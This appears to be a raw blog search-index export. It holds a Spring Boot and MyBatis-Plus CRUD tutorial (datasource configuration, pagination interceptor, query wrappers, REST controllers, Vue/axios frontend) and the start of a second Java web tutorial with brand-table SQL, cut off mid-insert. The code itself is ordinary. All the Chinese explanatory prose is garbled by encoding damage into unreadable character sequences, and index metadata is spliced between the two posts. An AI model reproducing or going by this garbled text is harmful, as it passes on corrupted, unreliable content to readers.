å¯¼å…¥mybatisplusã€æ•°æ®æºã€mysqlé©±åŠ¨çš„åæ ‡&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; (2)åœ¨application.xmlä¸­é…ç½®æ•°æ®æºä¿¡æ¯ spring: datasource: druid: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/javastudy?serverTimezone=UTC username: root password: root ==è‹¥è¿æ¥æ•°æ®åº“å‡ºç°æ—¶åŒºé”™è¯¯æ—¶å¯ä»¥åŠ ä¸Šå‚æ•°?serverTimezone=UTC== (3)ä½¿ç”¨MyBatisPlusçš„æ ‡å‡†é€šç”¨æ¥å£BaseMapperåŠ é€Ÿå¼€å‘@Mapper public interface BookDao extends BaseMapper&lt;Book&gt; &#123; &#125; ==æ³¨æ„== å¯¹æ•°æ®åº“æ“ä½œæ—¶éœ€è¦æŒ‡å®šæ•°æ®è¡¨çš„å‰ç¼€ï¼Œå¹¶è®¾ç½®ä¸»é”®å¢åŠ çš„ç­–ç•¥ï¼Œè¿™é‡Œä½¿ç”¨è‡ªå¢ mybatis-plus: global-config: db-config: table-prefix: tbl_ #è®¾ç½®è¡¨åé€šç”¨å‰ç¼€ id-type: auto #è®¾ç½®ä¸»é”®idå­—æ®µçš„ç”Ÿæˆç­–ç•¥ä¸ºå‚ç…§æ•°æ®åº“è®¾å®šçš„ç­–ç•¥ï¼Œå½“å‰æ•°æ®åº“è®¾ç½®idç”Ÿæˆç­–ç•¥ä¸ºè‡ªå¢ è®¾ç½®mybatisPlusçš„æ—¥å¿—æ˜¾ç¤ºæ ¼å¼ åœ¨è¿›è¡Œæ•°æ®å±‚æµ‹è¯•çš„æ—¶å€™ï¼Œå› ä¸ºåŸºç¡€çš„CRUDæ“ä½œå‡ç”±MyBatisPlusç»™æˆ‘ä»¬æä¾›äº†ï¼Œæ‰€ä»¥å°±å‡ºç°äº†ä¸€ä¸ªå±€é¢ï¼Œå¼€å‘è€…ä¸éœ€è¦ä¹¦å†™SQLè¯­å¥äº†ï¼Œè¿™æ ·ç¨‹åºè¿è¡Œçš„æ—¶å€™æ€»æœ‰ä¸€ç§æ„Ÿè§‰ï¼Œä¸€åˆ‡çš„ä¸€åˆ‡éƒ½æ˜¯é»‘ç›’çš„ï¼Œä½œä¸ºå¼€å‘è€…æˆ‘ä»¬å•¥ä¹Ÿä¸çŸ¥é“å°±å®Œäº†ã€‚å¦‚æœç¨‹åºæ­£å¸¸è¿è¡Œè¿˜å¥½ï¼Œå¦‚æœæŠ¥é”™äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¾ˆå´©æºƒï¼Œä½ ç”šè‡³éƒ½ä¸çŸ¥é“ä»ä½•ä¸‹æ‰‹ï¼Œå› ä¸ºä¼ é€’å‚æ•°ã€å°è£…SQLè¯­å¥è¿™äº›æ“ä½œå®Œå…¨ä¸æ˜¯ä½ å¼€å‘å‡ºæ¥çš„ï¼Œæ‰€ä»¥æŸ¥çœ‹æ‰§è¡ŒæœŸè¿è¡Œçš„SQLè¯­å¥å°±æˆä¸ºå½“åŠ¡ä¹‹æ€¥ã€‚ å¯ä»¥æ·»åŠ æ—¥å¿—é…ç½® mybatis-plus: global-config: db-config: table-prefix: tbl_ id-type: auto configuration: # è®¾ç½®mybatisplusçš„æ—¥å¿—ä¸ºæ ‡å‡†è¾“å…¥æ ¼å¼ å¯ä»¥æ˜¾ç¤ºæ‰§è¡Œçš„sqlè¯­å¥ã€æºå¸¦çš„å‚æ•°ä¸æŸ¥è¯¢ç»“æœ log-impl: org.apache.ibatis.logging.stdout.StdOutImpl æ•°æ®å±‚å¼€å‘-åˆ†é¡µåŠŸèƒ½Mybatis-plusä¸­å·²ç»å®ç°äº†åˆ†é¡µåŠŸèƒ½çš„APIï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ åˆ›å»ºPageå¯¹è±¡ï¼Œåˆ©ç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–æ‰€éœ€çš„å‚æ•°currentPageï¼ŒpageSize ä½¿ç”¨Mapper.selectPage()ä½¿ç”¨åˆ†é¡µæŸ¥è¯¢åŠŸèƒ½ IPage page = new Page(2,5); IPage page = bookDao.selectPage(page, null); ä½¿ç”¨åˆ†é¡µæŸ¥è¯¢è¿”å›çš„ç»“æœä»æ˜¯Pageç±»å‹ï¼Œå…¶ä¸­åŒ…å«å¤šæ¡æ•°æ®ï¼Œå¹¶ä¸”ä½¿ç”¨è¿”å›çš„ç»“æœå¯ä»¥è·å–åˆ°åˆ†é¡µçš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å½“å‰é¡µï¼Œæ€»è®°å½•æ•°ï¼Œå½“å‰é¡µè®°å½•æ•°ï¼Œå‰ä¸€é¡µç­‰ @Test void testGetPage()&#123; IPage page = new Page(2,5); bookDao.selectPage(page, null); System.out.println(page.getCurrent()); //å½“å‰é¡µç å€¼ System.out.println(page.getSize()); //æ¯é¡µæ˜¾ç¤ºæ•° System.out.println(page.getTotal()); //æ•°æ®æ€»é‡ System.out.println(page.getPages()); //æ€»é¡µæ•° System.out.println(page.getRecords()); //è¯¦ç»†æ•°æ® &#125; ä½†æ˜¯åœ¨ä½¿ç”¨åˆ†é¡µåŠŸèƒ½æ—¶éœ€è¦è®¾ç½®ä¸€ä¸ªæ‹¦æˆªå™¨ï¼ŒåŸºç¡€æ“ä½œä¸­æœ‰æŸ¥è¯¢å…¨éƒ¨çš„åŠŸèƒ½ï¼Œè€Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šåªéœ€è¦å‡çº§ä¸€ä¸‹ï¼ˆPLUSï¼‰å°±å¯ä»¥å¾—åˆ°åˆ†é¡µæ“ä½œã€‚æ‰€ä»¥MyBatisPluså°†åˆ†é¡µæ“ä½œåšæˆäº†ä¸€ä¸ªå¼€å…³ï¼Œä½ ç”¨åˆ†é¡µåŠŸèƒ½å°±æŠŠå¼€å…³å¼€å¯ï¼Œä¸ç”¨å°±ä¸éœ€è¦å¼€å¯è¿™ä¸ªå¼€å…³ã€‚è€Œæˆ‘ä»¬ç°åœ¨æ²¡æœ‰å¼€å¯è¿™ä¸ªå¼€å…³ï¼Œæ‰€ä»¥åˆ†é¡µæ“ä½œæ˜¯æ²¡æœ‰çš„ã€‚è¿™ä¸ªå¼€å…³æ˜¯é€šè¿‡MyBatisPlusçš„æ‹¦æˆªå™¨çš„å½¢å¼å­˜åœ¨çš„ã€‚ @Configuration public class MPConfig &#123; @Bean public MybatisPlusInterceptor mybatisPlusInterceptor()&#123; MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor()); // å½“éœ€è¦å…¶ä»–çš„æ‹¦æˆªå™¨æ—¶ç»§ç»­addInnerInterceptorå³å¯ // å¦‚æœåæœŸå¼€å‘å…¶ä»–åŠŸèƒ½ï¼Œéœ€è¦æ·»åŠ å…¨æ–°çš„æ‹¦æˆªå™¨ï¼ŒæŒ‰ç…§ç¬¬äºŒè¡Œçš„æ ¼å¼ç»§ç»­addè¿›å»æ–°çš„æ‹¦æˆªå™¨å°±å¯ä»¥äº†ã€‚ return interceptor; &#125; &#125; æ•°æ®å±‚å¼€å‘-æ¡ä»¶æŸ¥è¯¢MyBatisPluså°†è¿™äº›æ“ä½œéƒ½åˆ¶ä½œæˆAPIæ¥å£ï¼Œè°ƒç”¨ä¸€ä¸ªåˆä¸€ä¸ªçš„æ–¹æ³•å°±å¯ä»¥å®ç°å„ç§æ¡ä»¶çš„æ‹¼è£…ã€‚ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ @Test void testGetBy()&#123; QueryWrapper&lt;Book&gt; qw = new QueryWrapper&lt;&gt;(); qw.like(&quot;name&quot;,&quot;Spring&quot;); bookDao.selectList(qw); &#125; å…¶ä¸­ç¬¬ä¸€å¥QueryWrapperå¯¹è±¡æ˜¯ä¸€ä¸ªç”¨äºå°è£…æŸ¥è¯¢æ¡ä»¶çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯ä»¥åŠ¨æ€ä½¿ç”¨APIè°ƒç”¨çš„æ–¹æ³•æ·»åŠ æ¡ä»¶ï¼Œæœ€ç»ˆè½¬åŒ–æˆå¯¹åº”çš„SQLè¯­å¥ã€‚ç¬¬äºŒå¥å°±æ˜¯ä¸€ä¸ªæ¡ä»¶äº†ï¼Œéœ€è¦ä»€ä¹ˆæ¡ä»¶ï¼Œä½¿ç”¨QueryWapperå¯¹è±¡ç›´æ¥è°ƒç”¨å¯¹åº”æ“ä½œå³å¯ã€‚ä¸Šè¿°ä»£ç ä¸­æ‰§è¡Œçš„SQLè¯­å¥ä¸ºselect * from tbl_book where name like &#39;%spring%&#39;ï¼ŒMPè‡ªåŠ¨å¯¹æŸ¥è¯¢æ¡ä»¶è¿›è¡Œå¤„ç†ï¼Œçœå»äº†æ‰‹åŠ¨å¤„ç†çš„ä¸€æ­¥ã€‚ MyBatisPlusé’ˆå¯¹å­—æ®µæ£€æŸ¥è¿›è¡Œäº†åŠŸèƒ½å‡çº§ï¼Œå…¨é¢æ”¯æŒLambdaè¡¨è¾¾å¼ï¼Œå°±æœ‰äº†ä¸‹é¢è¿™ç»„APIã€‚ç”±QueryWrapperå¯¹è±¡å‡çº§ä¸ºLambdaQueryWrapperå¯¹è±¡ï¼Œå…¶ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š @Test void testGetBy2()&#123; String name = &quot;1&quot;; LambdaQueryWrapper&lt;Book&gt; lqw = new LambdaQueryWrapper&lt;Book&gt;(); lqw.like(Book::getName,name); bookDao.selectList(lqw); &#125; ä¸ºäº†ä¾¿äºå¼€å‘è€…åŠ¨æ€æ‹¼å†™SQLï¼Œé˜²æ­¢å°†nullæ•°æ®ä½œä¸ºæ¡ä»¶ä½¿ç”¨ï¼ŒMyBatisPlusè¿˜æä¾›äº†åŠ¨æ€æ‹¼è£…SQLçš„å¿«æ·ä¹¦å†™æ–¹å¼ã€‚ @Test void testGetBy2()&#123; String name = &quot;1&quot;; LambdaQueryWrapper&lt;Book&gt; lqw = new LambdaQueryWrapper&lt;Book&gt;(); //if(name != null) lqw.like(Book::getName,name); //æ–¹å¼ä¸€ï¼šJAVAä»£ç æ§åˆ¶ lqw.like(name != null,Book::getName,name); //æ–¹å¼äºŒï¼šAPIæ¥å£æä¾›æ§åˆ¶å¼€å…³ bookDao.selectList(lqw); &#125; ä¸šåŠ¡å±‚å¼€å‘å®šä¹‰ä¸šåŠ¡å±‚çš„æ¥å£BookService package com.sunzy.service; import com.baomidou.mybatisplus.core.metadata.IPage; import com.sunzy.domain.Book; import java.util.List; public interface BookService &#123; boolean save(Book book); boolean update(Book book); boolean delete(Integer id); List&lt;Book&gt; getAll(); Book getById(Integer id); IPage&lt;Book&gt; getPage(int currentPage, int pageSize); &#125; ä¸šåŠ¡å±‚æ¥å£çš„å®ç°ç±» package com.sunzy.service.impl; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.dao.BookDao; import com.sunzy.domain.Book; import com.sunzy.service.BookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.util.List; // æ³¨å†Œä¸ºæ•°æ®é€»è¾‘å±‚çš„bean @Service public class BookServiceImpl2 implements BookService &#123; @Autowired private BookDao bookDao; @Override public boolean save(Book book) &#123; return bookDao.insert(book) &gt; 0; &#125; @Override public boolean update(Book book) &#123; return bookDao.updateById(book) &gt; 0; &#125; @Override public boolean delete(Integer id) &#123; return bookDao.deleteById(id) &gt; 0; &#125; @Override public List&lt;Book&gt; getAll() &#123; return bookDao.selectList(null); &#125; @Override public Book getById(Integer id) &#123; return bookDao.selectById(id); &#125; @Override public IPage&lt;Book&gt; getPage(int currentPage, int pageSize) &#123; IPage&lt;Book&gt; page = new Page&lt;&gt;(currentPage, pageSize); return bookDao.selectPage(page, null); &#125; &#125; ä½¿ç”¨mybatisplusçš„è‡ªå¸¦æ¥å£å¿«é€Ÿå¼€å‘ ä¸šåŠ¡å±‚æ¥å£å¿«é€Ÿå¼€å‘ public interface IBookService extends IService&lt;Book&gt; &#123; //æ·»åŠ éé€šç”¨æ“ä½œAPIæ¥å£ &#125; â€‹ ä¸šåŠ¡å±‚æ¥å£å®ç°ç±»å¿«é€Ÿå¼€å‘ï¼Œå…³æ³¨ç»§æ‰¿çš„ç±»éœ€è¦ä¼ å…¥ä¸¤ä¸ªæ³›å‹ï¼Œä¸€ä¸ªæ˜¯æ•°æ®å±‚æ¥å£ï¼Œå¦ä¸€ä¸ªæ˜¯å®ä½“ç±»ã€‚ @Service public class BookServiceImpl extends ServiceImpl&lt;BookDao, Book&gt; implements IBookService &#123; @Autowired private BookDao bookDao; //æ·»åŠ éé€šç”¨æ“ä½œAPI &#125; â€‹ å¦‚æœæ„Ÿè§‰MyBatisPlusæä¾›çš„åŠŸèƒ½ä¸è¶³ä»¥æ”¯æ’‘ä½ çš„ä½¿ç”¨éœ€è¦ï¼ˆå…¶å®æ˜¯ä¸€å®šä¸èƒ½æ”¯æ’‘çš„ï¼Œå› ä¸ºéœ€æ±‚ä¸å¯èƒ½æ˜¯é€šç”¨çš„ï¼‰ï¼Œåœ¨åŸå§‹æ¥å£åŸºç¡€ä¸Šæ¥ç€å®šä¹‰æ–°çš„APIæ¥å£å°±è¡Œäº†ï¼Œæ­¤å¤„ä¸å†è¯´å¤ªå¤šäº†ï¼Œå°±æ˜¯è‡ªå®šä¹‰è‡ªå·±çš„æ“ä½œäº†ï¼Œä½†æ˜¯ä¸è¦å’Œå·²æœ‰çš„APIæ¥å£åå†²çªå³å¯ã€‚ æ€»ç»“ ä½¿ç”¨é€šç”¨æ¥å£ï¼ˆISerivceï¼‰å¿«é€Ÿå¼€å‘Service ä½¿ç”¨é€šç”¨å®ç°ç±»ï¼ˆServiceImpl&lt;M,T&gt;ï¼‰å¿«é€Ÿå¼€å‘ServiceImpl å¯ä»¥åœ¨é€šç”¨æ¥å£åŸºç¡€ä¸ŠåšåŠŸèƒ½é‡è½½æˆ–åŠŸèƒ½è¿½åŠ  æ³¨æ„é‡è½½æ—¶ä¸è¦è¦†ç›–åŸå§‹æ“ä½œï¼Œé¿å…åŸå§‹æä¾›çš„åŠŸèƒ½ä¸¢å¤± è¡¨ç°å±‚å¼€å‘è¡¨ç°å±‚æ¥å£å¦‚ä¸‹ï¼š package com.sunzy.controller; import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.domain.Book; import com.sunzy.service.IBookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.*; import java.util.List; //ä½¿ç”¨restfulæ¥å£çº¦æŸ @RestController @RequestMapping(&quot;/books&quot;) public class BookController2 &#123; @Autowired private IBookService service; @GetMapping public List&lt;Book&gt; getAll()&#123; return service.list(); &#125; @PostMapping public boolean save(@RequestBody Book book)&#123; System.out.println(book); return service.save(book); &#125; @PutMapping public boolean update(@RequestBody Book book)&#123; LambdaQueryWrapper&lt;Book&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.eq(Book::getId, book.getId()); return service.update(book,wrapper); &#125; @DeleteMapping(&quot;&#123;id&#125;&quot;) public boolean delete(@PathVariable int id)&#123; return service.removeById(id); &#125; @GetMapping(&quot;&#123;id&#125;&quot;) public Book getById(@PathVariable int id )&#123; return service.getById(id); &#125; @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) public IPage&lt;Book&gt; getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123; Page&lt;Book&gt; page = new Page&lt;&gt;(currentPage, pageSize); return service.page(page); &#125; &#125; ä½¿ç”¨postmanæµ‹è¯•å„ä¸ªæ¥å£æ˜¯å¦å¯ä»¥æ­£å¸¸å·¥ä½œ getByIdåŠŸèƒ½ åˆ†é¡µåŠŸèƒ½ save()åŠŸèƒ½ åˆ é™¤åŠŸèƒ½delete() ==æ¶ˆæ¯ä¸€è‡´æ€§å¤„ç†== @Data public class R &#123; private Boolean flag; //è¡¨ç¤ºæœ¬æ¬¡è¯·æ±‚æ˜¯å¦æˆåŠŸ private Object data; //æœ¬æ¬¡è¯·æ±‚è¿”å›çš„æ•°æ® &#125; ä½¿ç”¨æ¶ˆæ¯ä¸€è‡´å¤„ç†åè·å–çš„æ•°æ®æ ¼å¼ &#123; &quot;flag&quot;: true, &quot;data&quot;:&#123; &quot;id&quot;: 1, &quot;type&quot;: &quot;è®¡ç®—æœºç†è®º&quot;, &quot;name&quot;: &quot;Springå®æˆ˜ ç¬¬5ç‰ˆ&quot;, &quot;description&quot;: &quot;Springå…¥é—¨ç»å…¸æ•™ç¨‹&quot; &#125; &#125; ä¿®æ”¹è¡¨ç°å±‚ä»£ç  package com.sunzy.controller; import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.controller.utils.R; import com.sunzy.domain.Book; import com.sunzy.service.IBookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; import java.util.List; @RestController @RequestMapping(&quot;/books&quot;) public class BookController &#123; @Autowired private IBookService service; @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) public R getAll(@PathVariable int currentPage, @PathVariable int pageSize, Book book)&#123; IPage&lt;Book&gt; bookIPage = service.getAll(currentPage, pageSize, book); if(currentPage &gt; bookIPage.getPages()) &#123; bookIPage = service.getAll((int) bookIPage.getPages(), pageSize, book); &#125; return new R(null != bookIPage, bookIPage); &#125; @PostMapping public R save(@RequestBody Book book)&#123; return new R(service.save(book)); &#125; @PutMapping public R update(@RequestBody Book book)&#123; LambdaQueryWrapper&lt;Book&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.eq(Book::getId, book.getId()); return new R(service.update(book,wrapper)); &#125; @DeleteMapping(&quot;&#123;id&#125;&quot;) public R delete(@PathVariable int id)&#123; return new R(service.removeById(id)); &#125; @GetMapping(&quot;&#123;id&#125;&quot;) public R getById(@PathVariable int id )&#123; return new R(true, service.getById(id)); &#125; // @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) // public R getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123; // Page&lt;Book&gt; ipage = new Page&lt;&gt;(currentPage, pageSize); // Page&lt;Book&gt; page = service.page(ipage); // // if(currentPage &gt; page.getCurrent())&#123; // ipage.setCurrent(page.getPages()); // page = service.page(ipage); // &#125; // return new R(true, page); // &#125; &#125; å‰ç«¯é¡µé¢ä»£ç åˆ†é¡µæŸ¥è¯¢æ‰€æœ‰æ•°æ®å’Œæ¡ä»¶æŸ¥è¯¢é¡µé¢æ•°æ®æ¨¡å‹å®šä¹‰ data:&#123; dataList: [], //å½“å‰é¡µè¦å±•ç¤ºçš„åˆ—è¡¨æ•°æ® pagination: &#123; //åˆ†é¡µç›¸å…³æ¨¡å‹æ•°æ® currentPage: 1,//å½“å‰é¡µç  pageSize:10, //æ¯é¡µæ˜¾ç¤ºçš„è®°å½•æ•° total:0, //æ€»è®°å½•æ•° name:&#x27;&#x27;, type:&#x27;&#x27;, description:&#x27;&#x27; &#125; &#125; å¼‚æ­¥è¯·æ±‚ä»£ç  getAll() &#123; param = &quot;?name=&quot; + this.pagination.name; param = param + &quot;&amp;type=&quot; + this.pagination.type; param = param + &quot;&amp;description=&quot; + this.pagination.description; // console.log(param); axios.get(&quot;/books/&quot;+this.pagination.currentPage + &quot;/&quot; + this.pagination.pageSize + param).then((res)=&gt;&#123; this.dataList = res.data.data.records; this.pagination.total = res.data.data.total; this.pagination.currentPage = res.data.data.current; this.pagination.pagesize = res.data.data.size; &#125;); &#125; åœ¨é’©å­å‡½æ•°ä¸­æ‰§è¡Œè¯¥æ–¹æ³• //é’©å­å‡½æ•°ï¼ŒVUEå¯¹è±¡åˆå§‹åŒ–å®Œæˆåè‡ªåŠ¨æ‰§è¡Œ created() &#123; this.getAll(); &#125;, æ·»åŠ æ•°æ®æ·»åŠ æ•°æ®çš„çª—å£å¼¹å‡ºæ§åˆ¶ æ•°æ®æ¨¡å‹ dialogFormVisible: false,//æ·»åŠ è¡¨å•æ˜¯å¦å¯è§ formData å¯¹è¯æ¡†æ§åˆ¶å‡½æ•° //å¼¹å‡ºæ·»åŠ çª—å£ handleCreate() &#123; this.dialogFormVisible = true; this.resetForm(); &#125;, é‡ç½®è¡¨å•åŠŸèƒ½ //é‡ç½®è¡¨å• resetForm() &#123; this.formData = &#123;&#125;; &#125;, æ·»åŠ åŠŸèƒ½ handleAdd () &#123; axios.post(&quot;/books&quot;, this.formData).then((res) =&gt; &#123; if(res.data.flag)&#123; this.dialogFormVisible = false; this.$message.success(&quot;æ·»åŠ æˆåŠŸï¼&quot;); &#125;else&#123; this.$message.error(&quot;æ·»åŠ å¤±è´¥ï¼&quot;); &#125; &#125;).finally(() =&gt; &#123; this.getAll(); &#125;) &#125; åˆ é™¤æ•°æ®// åˆ é™¤ handleDelete(row) &#123; axios.delete(&quot;/books/&quot; + row.id).then((res)=&gt;&#123; if(res.data.flag)&#123; this.$message.success(&quot;åˆ é™¤æˆåŠŸï¼&quot;); this.getAll(); &#125;else&#123; this.$message.error(&quot;åˆ é™¤å¤±è´¥ï¼&quot;); &#125; &#125;) &#125;, ä¿®æ”¹æ•°æ®//å¼¹å‡ºç¼–è¾‘çª—å£ handleUpdate(row) &#123; this.dialogFormVisible4Edit = true; this.formData = row; &#125;, //ä¿®æ”¹ handleEdit() &#123; axios.put(&quot;/books&quot;, this.formData).then((res) =&gt; &#123; if(res.data.flag)&#123; this.dialogFormVisible4Edit = false; this.$message.success(&quot;ä¿®æ”¹æˆåŠŸï¼&quot;); &#125;else&#123; this.$message.error(&quot;ä¿®æ”¹å¤±è´¥ï¼&quot;); &#125; &#125;).finally(() =&gt; &#123; this.getAll(); &#125;) &#125;,","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"javaweb","date":"2022-03-30T05:08:56.000Z","path":"2022/03/30/javaweb/","text":"JavawebåŸºç¡€é¡¹ç›®å­¦å®Œ javaweb åšçš„å°é¡¹ç›® ç»¼åˆæ¡ˆä¾‹éœ€æ±‚ä¸å‡†å¤‡ä»Šæ—¥ç›®æ ‡ï¼š èƒ½å¤Ÿå®ŒæˆæŸ¥è¯¢æ‰€æœ‰åŠŸèƒ½ èƒ½å¤Ÿå®Œæˆæ·»åŠ åŠŸèƒ½ èƒ½å¤Ÿç†è§£ BaseServlet æ€æƒ³ èƒ½å¤Ÿå®Œæˆæ‰¹é‡åˆ é™¤åŠŸèƒ½ èƒ½å¤Ÿå®Œæˆåˆ†é¡µæŸ¥è¯¢åŠŸèƒ½ èƒ½å¤Ÿå®Œæˆæ¡ä»¶æŸ¥è¯¢åŠŸèƒ½ 1ï¼ŒåŠŸèƒ½ä»‹ç» ä»¥ä¸Šæ˜¯æˆ‘ä»¬åœ¨ç»¼åˆæ¡ˆä¾‹è¦å®ç°çš„åŠŸèƒ½ã€‚å¯¹æ•°æ®çš„é™¤äº†å¯¹æ•°æ®çš„å¢åˆ æ”¹æŸ¥åŠŸèƒ½å¤–ï¼Œè¿˜æœ‰ä¸€äº›å¤æ‚çš„åŠŸèƒ½ï¼Œå¦‚ æ‰¹é‡åˆ é™¤ã€åˆ†é¡µæŸ¥è¯¢ã€æ¡ä»¶æŸ¥è¯¢ ç­‰åŠŸèƒ½ æ‰¹é‡åˆ é™¤ åŠŸèƒ½ï¼šæ¯æ¡æ•°æ®å‰éƒ½æœ‰å¤é€‰æ¡†ï¼Œå½“æˆ‘é€‰ä¸­å¤šæ¡æ•°æ®å¹¶ç‚¹å‡» æ‰¹é‡åˆ é™¤ æŒ‰é’®åï¼Œä¼šå‘é€è¯·æ±‚åˆ°åç«¯å¹¶åˆ é™¤æ•°æ®åº“ä¸­æŒ‡å®šçš„å¤šæ¡æ•°æ®ã€‚ åˆ†é¡µæŸ¥è¯¢ åŠŸèƒ½ï¼šå½“æ•°æ®åº“ä¸­æœ‰å¾ˆå¤šæ•°æ®æ—¶ï¼Œæˆ‘ä»¬ä¸å¯èƒ½å°†æ‰€æœ‰çš„æ•°æ®å±•ç¤ºåœ¨ä¸€é¡µé‡Œï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦åˆ†é¡µå±•ç¤ºæ•°æ®ã€‚ æ¡ä»¶æŸ¥è¯¢ åŠŸèƒ½ï¼šæ•°æ®åº“é‡å¤§çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦ç²¾ç¡®çš„æŸ¥è¯¢ä¸€äº›æƒ³çœ‹åˆ°çš„æ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦é€šè¿‡æ¡ä»¶æŸ¥è¯¢ã€‚ è¿™é‡Œçš„ ä¿®æ”¹å“ç‰Œ å’Œ åˆ é™¤å“ç‰Œ åŠŸèƒ½åœ¨è¯¾ç¨‹ä¸Šä¸åšè®²è§£ï¼Œç•™ä½œåŒå­¦æ¥ä¸‹çš„ç»ƒä¹ ã€‚ 2ï¼Œç¯å¢ƒå‡†å¤‡ç¯å¢ƒå‡†å¤‡æˆ‘ä»¬ä¸»è¦å®Œæˆä»¥ä¸‹ä¸¤ä»¶äº‹å³å¯ å°†èµ„æ–™çš„ brand-case æ¨¡å—å¯¼å…¥åˆ° ideaä¸­ æ‰§è¡Œèµ„æ–™ä¸­æä¾›çš„ tb_brand.sqlè„šæœ¬ åœ¨æ²¡æœ‰èµ„æ–™çš„æƒ…å†µä¸‹åœ¨ideaä¸­åˆ›å»ºmavençš„webé¡¹ç›®å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³• file -&gt; new -&gt; module-&gt;Maven-&gt;Create from archetype-&gt;maven archetype-&gt;next 2.1 å·¥ç¨‹å‡†å¤‡å°† 04-èµ„æ–™\\01-åˆå§‹å·¥ç¨‹ ä¸­çš„ brand-case å·¥ç¨‹å¯¼å…¥åˆ°æˆ‘ä»¬è‡ªå·±çš„ idea ä¸­ã€‚å·¥ç¨‹ç»“æ„å¦‚ä¸‹ï¼š 2.2 åˆ›å»ºè¡¨ä¸‹é¢æ˜¯åˆ›å»ºè¡¨çš„è¯­å¥ -- åˆ é™¤tb_brandè¡¨ drop table if exists tb_brand; -- åˆ›å»ºtb_brandè¡¨ create table tb_brand ( -- id ä¸»é”® id int primary key auto_increment, -- å“ç‰Œåç§° brand_name varchar(20), -- ä¼ä¸šåç§° company_name varchar(20), -- æ’åºå­—æ®µ ordered int, -- æè¿°ä¿¡æ¯ description varchar(100), -- çŠ¶æ€ï¼š0ï¼šç¦ç”¨ 1ï¼šå¯ç”¨ status int ); -- æ·»åŠ æ•°æ® insert into tb_brand (brand_name, company_name, ordered, description, status) values (&#x27;åä¸º&#x27;, &#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;, 100, &#x27;ä¸‡ç‰©äº’è”&#x27;, 1), (&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;æ ¼åŠ›&#x27;, &#x27;æ ¼åŠ›ç”µå™¨è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 30, &#x27;è®©ä¸–ç•Œçˆ±ä¸Šä¸­å›½é€ &#x27;, 1), (&#x27;é˜¿é‡Œå·´å·´&#x27;, &#x27;é˜¿é‡Œå·´å·´é›†å›¢æ§è‚¡æœ‰é™å…¬å¸&#x27;, 10, &#x27;ä¹°ä¹°ä¹°&#x27;, 1), (&#x27;è…¾è®¯&#x27;, &#x27;è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸&#x27;, 50, &#x27;ç©ç©ç©&#x27;, 0), (&#x27;ç™¾åº¦&#x27;, &#x27;ç™¾åº¦åœ¨çº¿ç½‘ç»œæŠ€æœ¯å…¬å¸&#x27;, 5, &#x27;æœæœæœ&#x27;, 0), (&#x27;äº¬ä¸œ&#x27;, &#x27;åŒ—äº¬äº¬ä¸œä¸–çºªè´¸æ˜“æœ‰é™å…¬å¸&#x27;, 40, &#x27;å°±æ˜¯å¿«&#x27;, 1), (&#x27;å°ç±³&#x27;, &#x27;å°ç±³ç§‘æŠ€æœ‰é™å…¬å¸&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;ä¸‰åªæ¾é¼ &#x27;, &#x27;ä¸‰åªæ¾é¼ è‚¡ä»½æœ‰é™å…¬å¸&#x27;, 5, &#x27;å¥½åƒä¸ä¸Šç«&#x27;, 0), (&#x27;åä¸º&#x27;, &#x27;åä¸ºæŠ€æœ¯æœ‰é™å…¬å¸&#x27;, 100, &#x27;ä¸‡ç‰©äº’è”&#x27;, 1), 